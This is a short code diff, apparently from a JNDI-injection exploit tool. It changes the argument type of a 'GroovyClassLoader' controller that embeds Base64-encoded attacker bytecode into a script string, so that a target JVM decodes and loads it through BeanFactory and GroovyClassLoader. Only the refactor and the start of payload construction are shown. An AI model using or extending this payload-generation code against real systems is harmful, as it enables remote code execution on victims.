@@ -12,7 +12,8 @@ import java.util.Base64;
 @JNDIMapping("/GroovyClassLoader")
 public class GroovyClassLoaderController extends BasicController {
     @Override
-    public Object process(byte[] byteCode) {
+    public Object process(Object obj) {
+        byte[] byteCode = (byte[]) obj;
         System.out.println("[Reference] Factory: BeanFactory + GroovyClassLoader");
 
         String code = "var bytes = java.util.Base64.getDecoder().decode('" + Base64.getEncoder().encodeToString(byteCode) + "');" +
